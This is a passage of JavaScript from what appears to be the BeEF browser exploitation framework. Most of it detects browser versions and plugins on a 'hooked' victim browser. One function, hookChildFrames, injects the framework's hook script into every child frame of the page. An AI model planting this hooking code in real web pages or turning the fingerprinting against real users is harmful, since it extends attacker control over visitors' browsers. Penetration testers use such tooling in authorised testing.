        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 36.
     * @example: beef.browser.isC36iOS()
     */
    isC36iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome 37.
     * @example: beef.browser.isC37()
     */
    isC37: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 37.
     * @example: beef.browser.isC37iOS()
     */
    isC37iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome 38.
     * @example: beef.browser.isC38()
     */
    isC38: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 38.
     * @example: beef.browser.isC38iOS()
     */
    isC38iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome 39.
     * @example: beef.browser.isC39()
     */
    isC39: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 39.
     * @example: beef.browser.isC39iOS()
     */
    isC39iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome 40.
     * @example: beef.browser.isC40()
     */
    isC40: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 40.
     * @example: beef.browser.isC40iOS()
     */
    isC40iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome 41.
     * @example: beef.browser.isC41()
     */
    isC41: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 41.
     * @example: beef.browser.isC41iOS()
     */
    isC41iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome 42.
     * @example: beef.browser.isC42()
     */
    isC42: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 42.
     * @example: beef.browser.isC42iOS()
     */
    isC42iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome 43.
     * @example: beef.browser.isC43()
     */
    isC43: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 43.
     * @example: beef.browser.isC43iOS()
     */
    isC43iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome 44.
     * @example: beef.browser.isC44()
     */
    isC44: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 44.
     * @example: beef.browser.isC44iOS()
     */
    isC44iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome 45.
     * @example: beef.browser.isC45()
     */
    isC45: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome 46.
     * @example: beef.browser.isC46()
     */
    isC46: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    isC47: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 45.
     * @example: beef.browser.isC45iOS()
     */
    isC45iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome.
     * @example: beef.browser.isC()
     */
    isC: function () {
        return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC19iOS() || this.isC20() || this.isC20iOS() || this.isC21() || this.isC21iOS() || this.isC22() || this.isC22iOS() || this.isC23() || this.isC23iOS() || this.isC24() || this.isC24iOS() || this.isC25() || this.isC25iOS() || this.isC26() || this.isC26iOS() || this.isC27() || this.isC27iOS() || this.isC28() || this.isC28iOS() || this.isC29() || this.isC29iOS() || this.isC30() || this.isC30iOS() || this.isC31() || this.isC31iOS() || this.isC32() || this.isC32iOS() || this.isC33() || this.isC33iOS() || this.isC34() || this.isC34iOS() || this.isC35() || this.isC35iOS() || this.isC36() || this.isC36iOS() || this.isC37() || this.isC37iOS() || this.isC38() || this.isC38iOS() || this.isC39() || this.isC39iOS() || this.isC40() || this.isC40iOS() || this.isC41() || this.isC41iOS() || this.isC42() || this.isC42iOS() || this.isC43() || this.isC43iOS() || this.isC44() || this.isC44iOS() || this.isC45() || this.isC46()  || this.isC47()|| this.isC45iOS();
    },

    /**
     * Returns true if Opera 9.50 through 9.52.
     * @example: beef.browser.isO9_52()
     */
    isO9_52: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
    },

    /**
     * Returns true if Opera 9.60 through 9.64.
     * @example: beef.browser.isO9_60()
     */
    isO9_60: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
    },

    /**
     * Returns true if Opera 10.xx.
     * @example: beef.browser.isO10()
     */
    isO10: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
    },

    /**
     * Returns true if Opera 11.xx.
     * @example: beef.browser.isO11()
     */
    isO11: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
    },

    /**
     * Returns true if Opera 12.xx.
     * @example: beef.browser.isO12()
     */
    isO12: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
    },

    /**
     * Returns true if Opera.
     * @example: beef.browser.isO()
     */
    isO: function () {
        return this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
    },

    /**
     * Returns a hash of string keys representing a given capability
     * @example: beef.browser.capabilities()["navigator.plugins"]
     */
    capabilities: function () {
        var out = {};
        var type = this.type();

        out["navigator.plugins"] = (type.IE11 || !type.IE);

        return out;
    },

    /**
     * Returns the type of browser being used.
     * @example: beef.browser.type().IE6
     * @example: beef.browser.type().FF
     * @example: beef.browser.type().O
     */
    type: function () {

        return {
            C5: this.isC5(), // Chrome 5
            C6: this.isC6(), // Chrome 6
            C7: this.isC7(), // Chrome 7
            C8: this.isC8(), // Chrome 8
            C9: this.isC9(), // Chrome 9
            C10: this.isC10(), // Chrome 10
            C11: this.isC11(), // Chrome 11
            C12: this.isC12(), // Chrome 12
            C13: this.isC13(), // Chrome 13
            C14: this.isC14(), // Chrome 14
            C15: this.isC15(), // Chrome 15
            C16: this.isC16(), // Chrome 16
            C17: this.isC17(), // Chrome 17
            C18: this.isC18(), // Chrome 18
            C19: this.isC19(), // Chrome 19
            C19iOS: this.isC19iOS(), // Chrome 19 on iOS
            C20: this.isC20(), // Chrome 20
            C20iOS: this.isC20iOS(), // Chrome 20 on iOS
            C21: this.isC21(), // Chrome 21
            C21iOS: this.isC21iOS(), // Chrome 21 on iOS
            C22: this.isC22(), // Chrome 22
            C22iOS: this.isC22iOS(), // Chrome 22 on iOS
            C23: this.isC23(), // Chrome 23
            C23iOS: this.isC23iOS(), // Chrome 23 on iOS
            C24: this.isC24(), // Chrome 24
            C24iOS: this.isC24iOS(), // Chrome 24 on iOS
            C25: this.isC25(), // Chrome 25
            C25iOS: this.isC25iOS(), // Chrome 25 on iOS
            C26: this.isC26(), // Chrome 26
            C26iOS: this.isC26iOS(), // Chrome 26 on iOS
            C27: this.isC27(), // Chrome 27
            C27iOS: this.isC27iOS(), // Chrome 27 on iOS
            C28: this.isC28(), // Chrome 28
            C28iOS: this.isC28iOS(), // Chrome 28 on iOS
            C29: this.isC29(), // Chrome 29
            C29iOS: this.isC29iOS(), // Chrome 29 on iOS
            C30: this.isC30(), // Chrome 30
            C30iOS: this.isC30iOS(), // Chrome 30 on iOS
            C31: this.isC31(), // Chrome 31
            C31iOS: this.isC31iOS(), // Chrome 31 on iOS
            C32: this.isC32(), // Chrome 32
            C32iOS: this.isC32iOS(), // Chrome 32 on iOS
            C33: this.isC33(), // Chrome 33
            C33iOS: this.isC33iOS(), // Chrome 33 on iOS
            C34: this.isC34(), // Chrome 34
            C34iOS: this.isC34iOS(), // Chrome 34 on iOS
            C35: this.isC35(), // Chrome 35
            C35iOS: this.isC35iOS(), // Chrome 35 on iOS
            C36: this.isC36(), // Chrome 36
            C36iOS: this.isC36iOS(), // Chrome 36 on iOS
            C37: this.isC37(), // Chrome 37
            C37iOS: this.isC37iOS(), // Chrome 37 on iOS
            C38: this.isC38(), // Chrome 38
            C38iOS: this.isC38iOS(), // Chrome 38 on iOS
            C39: this.isC39(), // Chrome 39
            C39iOS: this.isC39iOS(), // Chrome 39 on iOS
            C40: this.isC40(), // Chrome 40
            C40iOS: this.isC40iOS(), // Chrome 40 on iOS
            C41: this.isC41(), // Chrome 41
            C41iOS: this.isC41iOS(), // Chrome 41 on iOS
            C42: this.isC42(), // Chrome 42
            C42iOS: this.isC42iOS(), // Chrome 42 on iOS
            C43: this.isC43(), // Chrome 43
            C43iOS: this.isC43iOS(), // Chrome 43 on iOS
            C44: this.isC44(), // Chrome 44
            C44iOS: this.isC44iOS(), // Chrome 44 on iOS
            C45: this.isC45(), // Chrome 45
            C46: this.isC46(), // Chrome 46
            C47: this.isC47(), // Chrome 46
            C45iOS: this.isC45iOS(), // Chrome 45 on iOS

            C: this.isC(), // Chrome any version

            FF2: this.isFF2(), // Firefox 2
            FF3: this.isFF3(), // Firefox 3
            FF3_5: this.isFF3_5(), // Firefox 3.5
            FF3_6: this.isFF3_6(), // Firefox 3.6
            FF4: this.isFF4(), // Firefox 4
            FF5: this.isFF5(), // Firefox 5
            FF6: this.isFF6(), // Firefox 6
            FF7: this.isFF7(), // Firefox 7
            FF8: this.isFF8(), // Firefox 8
            FF9: this.isFF9(), // Firefox 9
            FF10: this.isFF10(), // Firefox 10
            FF11: this.isFF11(), // Firefox 11
            FF12: this.isFF12(), // Firefox 12
            FF13: this.isFF13(), // Firefox 13
            FF14: this.isFF14(), // Firefox 14
            FF15: this.isFF15(), // Firefox 15
            FF16: this.isFF16(), // Firefox 16
            FF17: this.isFF17(), // Firefox 17
            FF18: this.isFF18(), // Firefox 18
            FF19: this.isFF19(), // Firefox 19
            FF20: this.isFF20(), // Firefox 20
            FF21: this.isFF21(), // Firefox 21
            FF22: this.isFF22(), // Firefox 22
            FF23: this.isFF23(), // Firefox 23
            FF24: this.isFF24(), // Firefox 24
            FF25: this.isFF25(), // Firefox 25
            FF26: this.isFF26(), // Firefox 26
            FF27: this.isFF27(), // Firefox 27
            FF28: this.isFF28(), // Firefox 28
            FF29: this.isFF29(), // Firefox 29
            FF30: this.isFF30(), // Firefox 30
            FF31: this.isFF31(), // Firefox 31
            FF32: this.isFF32(), // Firefox 32
            FF33: this.isFF33(), // Firefox 33
            FF34: this.isFF34(), // Firefox 34
            FF35: this.isFF35(), // Firefox 35
            FF36: this.isFF36(), // Firefox 36
            FF37: this.isFF37(), // Firefox 37
            FF38: this.isFF38(), // Firefox 38
            FF39: this.isFF39(), // Firefox 39
            FF40: this.isFF40(), // Firefox 40
            FF41: this.isFF41(), // Firefox 41
            FF42: this.isFF42(), // Firefox 42
            FF43: this.isFF43(), // Firefox 43
            FF: this.isFF(),   // Firefox any version

            IE6: this.isIE6(), // Internet Explorer 6
            IE7: this.isIE7(), // Internet Explorer 7
            IE8: this.isIE8(), // Internet Explorer 8
            IE9: this.isIE9(), // Internet Explorer 9
            IE10: this.isIE10(), // Internet Explorer 10
            IE11: this.isIE11(), // Internet Explorer 11
            IE: this.isIE(), // Internet Explorer any version

            O9_52: this.isO9_52(), // Opera 9.50 through 9.52
            O9_60: this.isO9_60(), // Opera 9.60 through 9.64
            O10: this.isO10(), // Opera 10.xx
            O11: this.isO11(), // Opera 11.xx
            O12: this.isO12(), // Opera 12.xx
            O: this.isO(),   // Opera any version

            S4: this.isS4(), // Safari 4.xx
            S5: this.isS5(), // Safari 5.xx
            S6: this.isS6(), // Safari 6.x
            S7: this.isS7(), // Safari 7.x
            S8: this.isS8(), // Safari 8.x
            S: this.isS()   // Safari any version
        }
    },

    /**
     * Returns the type of browser being used.
     * @return: {String} User agent software and version.
     *
     * @example: beef.browser.getBrowserVersion()
     */
    getBrowserVersion: function () {

        if (this.isC5()) {
            return '5'
        }
        ; 	// Chrome 5
        if (this.isC6()) {
            return '6'
        }
        ; 	// Chrome 6
        if (this.isC7()) {
            return '7'
        }
        ; 	// Chrome 7
        if (this.isC8()) {
            return '8'
        }
        ; 	// Chrome 8
        if (this.isC9()) {
            return '9'
        }
        ; 	// Chrome 9
        if (this.isC10()) {
            return '10'
        }
        ; 	// Chrome 10
        if (this.isC11()) {
            return '11'
        }
        ; 	// Chrome 11
        if (this.isC12()) {
            return '12'
        }
        ; 	// Chrome 12
        if (this.isC13()) {
            return '13'
        }
        ; 	// Chrome 13
        if (this.isC14()) {
            return '14'
        }
        ; 	// Chrome 14
        if (this.isC15()) {
            return '15'
        }
        ; 	// Chrome 15
        if (this.isC16()) {
            return '16'
        }
        ;	// Chrome 16
        if (this.isC17()) {
            return '17'
        }
        ;	// Chrome 17
        if (this.isC18()) {
            return '18'
        }
        ;	// Chrome 18
        if (this.isC19()) {
            return '19'
        }
        ;	// Chrome 19
        if (this.isC19iOS()) {
            return '19'
        }
        ;   // Chrome 19 for iOS
        if (this.isC20()) {
            return '20'
        }
        ;	// Chrome 20
        if (this.isC20iOS()) {
            return '20'
        }
        ;   // Chrome 20 for iOS
        if (this.isC21()) {
            return '21'
        }
        ;	// Chrome 21
        if (this.isC21iOS()) {
            return '21'
        }
        ;   // Chrome 21 for iOS
        if (this.isC22()) {
            return '22'
        }
        ;    // Chrome 22
        if (this.isC22iOS()) {
            return '22'
        }
        ;   // Chrome 22 for iOS
        if (this.isC23()) {
            return '23'
        }
        ;    // Chrome 23
        if (this.isC23iOS()) {
            return '23'
        }
        ;   // Chrome 23 for iOS
        if (this.isC24()) {
            return '24'
        }
        ;    // Chrome 24
        if (this.isC24iOS()) {
            return '24'
        }
        ;   // Chrome 24 for iOS
        if (this.isC25()) {
            return '25'
        }
        ;    // Chrome 25
        if (this.isC25iOS()) {
            return '25'
        }
        ;   // Chrome 25 for iOS
        if (this.isC26()) {
            return '26'
        }
        ;    // Chrome 26
        if (this.isC26iOS()) {
            return '26'
        }
        ;   // Chrome 26 for iOS
        if (this.isC27()) {
            return '27'
        }
        ;    // Chrome 27
        if (this.isC27iOS()) {
            return '27'
        }
        ;   // Chrome 27 for iOS
        if (this.isC28()) {
            return '28'
        }
        ;    // Chrome 28
        if (this.isC28iOS()) {
            return '28'
        }
        ;   // Chrome 28 for iOS
        if (this.isC29()) {
            return '29'
        }
        ;    // Chrome 29
        if (this.isC29iOS()) {
            return '29'
        }
        ;   // Chrome 29 for iOS
        if (this.isC30()) {
            return '30'
        }
        ;    // Chrome 30
        if (this.isC30iOS()) {
            return '30'
        }
        ;   // Chrome 30 for iOS
        if (this.isC31()) {
            return '31'
        }
        ;   // Chrome 31
        if (this.isC31iOS()) {
            return '31'
        }
        ;   // Chrome 31 for iOS
        if (this.isC32()) {
            return '32'
        }
        ;   // Chrome 32
        if (this.isC32iOS()) {
            return '32'
        }
        ;   // Chrome 32 for iOS
        if (this.isC33()) {
            return '33'
        }
        ;   // Chrome 33
        if (this.isC33iOS()) {
            return '33'
        }
        ;   // Chrome 33 for iOS
        if (this.isC34()) {
            return '34'
        }
        ;   // Chrome 34
        if (this.isC34iOS()) {
            return '34'
        }
        ;   // Chrome 34 for iOS
        if (this.isC35()) {
            return '35'
        }
        ;   // Chrome 35
        if (this.isC35iOS()) {
            return '35'
        }
        ;   // Chrome 35 for iOS
        if (this.isC36()) {
            return '36'
        }
        ;   // Chrome 36
        if (this.isC36iOS()) {
            return '36'
        }
        ;   // Chrome 36 for iOS
        if (this.isC37()) {
            return '37'
        }
        ;   // Chrome 37
        if (this.isC37iOS()) {
            return '37'
        }
        ;   // Chrome 37 for iOS
        if (this.isC38()) {
            return '38'
        }
        ;   // Chrome 38
        if (this.isC38iOS()) {
            return '38'
        }
        ;   // Chrome 38 for iOS
        if (this.isC39()) {
            return '39'
        }
        ;   // Chrome 39
        if (this.isC39iOS()) {
            return '39'
        }
        ;   // Chrome 39 for iOS
        if (this.isC40()) {
            return '40'
        }
        ;   // Chrome 40
        if (this.isC40iOS()) {
            return '40'
        }
        ;   // Chrome 40 for iOS
        if (this.isC41()) {
            return '41'
        }
        ;   // Chrome 41
        if (this.isC41iOS()) {
            return '41'
        }
        ;   // Chrome 41 for iOS
        if (this.isC42()) {
            return '42'
        }
        ;   // Chrome 42
        if (this.isC42iOS()) {
            return '42'
        }
        ;   // Chrome 42 for iOS
        if (this.isC43()) {
            return '43'
        }
        ;   // Chrome 43
        if (this.isC43iOS()) {
            return '43'
        }
        ;   // Chrome 43 for iOS
        if (this.isC44()) {
            return '44'
        }
        ;   // Chrome 44
        if (this.isC44iOS()) {
            return '44'
        }
        ;   // Chrome 44 for iOS
        if (this.isC45()) {
            return '45'
        }
        ;   // Chrome 45
        if (this.isC46()) {
            return '46'
        }
        ;// Chrome 46
        if (this.isC47()) {
            return '47'
        }
        ;// Chrome 47
        if (this.isC45iOS()) {
            return '45'
        }
        ;   // Chrome 45 for iOS

        if (this.isFF2()) {
            return '2'
        }
        ;	// Firefox 2
        if (this.isFF3()) {
            return '3'
        }
        ;	// Firefox 3
        if (this.isFF3_5()) {
            return '3.5'
        }
        ;	// Firefox 3.5
        if (this.isFF3_6()) {
            return '3.6'
        }
        ;	// Firefox 3.6
        if (this.isFF4()) {
            return '4'
        }
        ;	// Firefox 4
        if (this.isFF5()) {
            return '5'
        }
        ;	// Firefox 5
        if (this.isFF6()) {
            return '6'
        }
        ;	// Firefox 6
        if (this.isFF7()) {
            return '7'
        }
        ;	// Firefox 7
        if (this.isFF8()) {
            return '8'
        }
        ;	// Firefox 8
        if (this.isFF9()) {
            return '9'
        }
        ;	// Firefox 9
        if (this.isFF10()) {
            return '10'
        }
        ;	// Firefox 10
        if (this.isFF11()) {
            return '11'
        }
        ;	// Firefox 11
        if (this.isFF12()) {
            return '12'
        }
        ;	// Firefox 12
        if (this.isFF13()) {
            return '13'
        }
        ;	// Firefox 13
        if (this.isFF14()) {
            return '14'
        }
        ;	// Firefox 14
        if (this.isFF15()) {
            return '15'
        }
        ;	// Firefox 15
        if (this.isFF16()) {
            return '16'
        }
        ;	// Firefox 16
        if (this.isFF17()) {
            return '17'
        }
        ;    // Firefox 17
        if (this.isFF18()) {
            return '18'
        }
        ;    // Firefox 18
        if (this.isFF19()) {
            return '19'
        }
        ;    // Firefox 19
        if (this.isFF20()) {
            return '20'
        }
        ;    // Firefox 20
        if (this.isFF21()) {
            return '21'
        }
        ;    // Firefox 21
        if (this.isFF22()) {
            return '22'
        }
        ;   // Firefox 22
        if (this.isFF23()) {
            return '23'
        }
        ;   // Firefox 23
        if (this.isFF24()) {
            return '24'
        }
        ;   // Firefox 24
        if (this.isFF25()) {
            return '25'
        }
        ;   // Firefox 25
        if (this.isFF26()) {
            return '26'
        }
        ;   // Firefox 26
        if (this.isFF27()) {
            return '27'
        }
        ;   // Firefox 27
        if (this.isFF28()) {
            return '28'
        }
        ;   // Firefox 28
        if (this.isFF29()) {
            return '29'
        }
        ;   // Firefox 29
        if (this.isFF30()) {
            return '30'
        }
        ;   // Firefox 30
        if (this.isFF31()) {
            return '31'
        }
        ;   // Firefox 31
        if (this.isFF32()) {
            return '32'
        }
        ;   // Firefox 32
        if (this.isFF33()) {
            return '33'
        }
        ;   // Firefox 33
        if (this.isFF34()) {
            return '34'
        }
        ;   // Firefox 34
        if (this.isFF35()) {
            return '35'
        }
        ;   // Firefox 35
        if (this.isFF36()) {
            return '36'
        }
        ;   // Firefox 36
        if (this.isFF37()) {
            return '37'
        }
        ;   // Firefox 37
        if (this.isFF38()) {
            return '38'
        }
        ;   // Firefox 38
        if (this.isFF39()) {
            return '39'
        }
        ;   // Firefox 39
        if (this.isFF40()) {
            return '40'
        }
        ;   // Firefox 40
        if (this.isFF41()) {
            return '41'
        }
        ;   // Firefox 41
        if (this.isFF42()) {
            return '42'
        }
        ;   // Firefox 42
        if (this.isFF43()) {
            return '43'
        }
        ;   // Firefox 43

        if (this.isIE6()) {
            return '6'
        }
        ;	// Internet Explorer 6
        if (this.isIE7()) {
            return '7'
        }
        ;	// Internet Explorer 7
        if (this.isIE8()) {
            return '8'
        }
        ;	// Internet Explorer 8
        if (this.isIE9()) {
            return '9'
        }
        ;	// Internet Explorer 9
        if (this.isIE10()) {
            return '10'
        }
        ;	// Internet Explorer 10
        if (this.isIE11()) {
            return '11'
        }
        ;   // Internet Explorer 11

        if (this.isS4()) {
            return '4'
        }
        ;	// Safari 4
        if (this.isS5()) {
            return '5'
        }
        ;	// Safari 5
        if (this.isS6()) {
            return '6'
        }
        ;	// Safari 6

        if (this.isS7()) {
            return '7'
        }
        ;	// Safari 7
        if (this.isS8()) {
            return '8'
        }
        ;       // Safari 8

        if (this.isO9_52()) {
            return '9.5'
        }
        ;	// Opera 9.5x
        if (this.isO9_60()) {
            return '9.6'
        }
        ;	// Opera 9.6
        if (this.isO10()) {
            return '10'
        }
        ;	// Opera 10.xx
        if (this.isO11()) {
            return '11'
        }
        ;	// Opera 11.xx
        if (this.isO12()) {
            return '12'
        }
        ;	// Opera 12.xx

        return 'UNKNOWN';				// Unknown UA
    },

    /**
     * Returns the type of user agent by hooked browser.
     * @return: {String} User agent software.
     *
     * @example: beef.browser.getBrowserName()
     */
    getBrowserName: function () {

        if (this.isC()) {
            return 'C'
        }
        ; 	// Chrome any version
        if (this.isFF()) {
            return 'FF'
        }
        ;		// Firefox any version
        if (this.isIE()) {
            return 'IE'
        }
        ;		// Internet Explorer any version
        if (this.isO()) {
            return 'O'
        }
        ;		// Opera any version
        if (this.isS()) {
            return 'S'
        }
        ;		// Safari any version
        return 'UNKNOWN';					// Unknown UA
    },

    /**
     * Hooks all child frames in the current window
     * Restricted by same-origin policy
     */
    hookChildFrames: function () {

        // create script object
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = 'SKS_1';

        // loop through child frames
        for (var i = 0; i < self.frames.length; i++) {
            try {
                // append hook script
                self.frames[i].document.body.appendChild(script);
                beef.debug("Hooked child frame [src:" + self.frames[i].window.location.href + "]");
            } catch (e) {
                // warn on cross-origin
                beef.debug("Hooking child frame failed: " + e.message);
            }
        }
    },

    /**
     * Checks if the zombie has flash installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFlash()) { ... }
     */
    hasFlash: function () {
        if (!this.type().IE) {
            return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
        } else {
            flash_versions = 12;
            flash_installed = false;


            if (this.type().IE11) {
                flash_installed = (navigator.plugins["Shockwave Flash"] != undefined);
            } else {
                if (window.ActiveXObject != null) {
                    for (x = 2; x <= flash_versions; x++) {
                        try {
                            Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
                            if (Flash) {
                                flash_installed = true;
                            }
                        } catch (e) {
                            beef.debug("Creating Flash ActiveX object failed: " + e.message);
                        }
                    }
                }
            }
            return flash_installed;
        }
    },

    /**
     * Checks if the zombie has the QuickTime plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasQuickTime() ) { ... }
     */
    hasQuickTime: function () {

        var quicktime = false;

        if (this.capabilities()["navigator.plugins"]) {

            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                    quicktime = true;
                }

            }

            // Has navigator.plugins
        } else {

            try {

                var qt_test = new ActiveXObject('QuickTime.QuickTime');

            } catch (e) {
                beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
            }

            if (qt_test) {
                quicktime = true;
            }

        }

        return quicktime;

    },

    /**
     * Checks if the zombie has the RealPlayer plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasRealPlayer() ) { ... }
     */
    hasRealPlayer: function () {

        var realplayer = false;

        if (this.capabilities()["navigator.plugins"]) {


            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
                    realplayer = true;
                }

            }

            // has navigator.plugins
        } else {

            var definedControls = [
                'RealPlayer',
                'rmocx.RealPlayer G2 Control',
                'rmocx.RealPlayer G2 Control.1',
                'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
                'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
            ];

            for (var i = 0; i < definedControls.length; i++) {

                try {
                    var rp_test = new ActiveXObject(definedControls[i]);
                } catch (e) {
                    beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
                }

                if (rp_test) {
                    realplayer = true;

                }
            }
        }

        return realplayer;

    },

    /**
     * Checks if the zombie has the Windows Media Player plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasWMP() ) { ... }
     */
    hasWMP: function () {

        var wmp = false;

        if (this.capabilities()["navigator.plugins"]) {


            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
                    wmp = true;
                }

            }

            // Has navigator.plugins
        } else {

            try {

                var wmp_test = new ActiveXObject('WMPlayer.OCX');

            } catch (e) {
                beef.debug("Creating WMP ActiveX object failed: " + e.message);
            }

            if (wmp_test) {
                wmp = true;
            }

        }

        return wmp;

    },

    /**
     *  Checks if VLC is installed
     *  @return: {Boolean} true or false
     **/
    hasVLC: function () {
        var vlc = false;
        if (!this.type().IE) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
                    vlc = true;
                }
            }
        } else {
            try {
                control = new ActiveXObject("VideoLAN.VLCPlugin.2");
                vlc = true;
            } catch (e) {
                beef.debug("Creating VLC ActiveX object failed: " + e.message);
            }
        }
        return vlc;
    },

    /**
     * Checks if the zombie has Java enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.javaEnabled()) { ... }
     */
    javaEnabled: function () {

        return navigator.javaEnabled();

    },

    /**
     * Checks if the Phonegap API is available from the hooked origin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasPhonegap()) { ... }
     */
    hasPhonegap: function () {
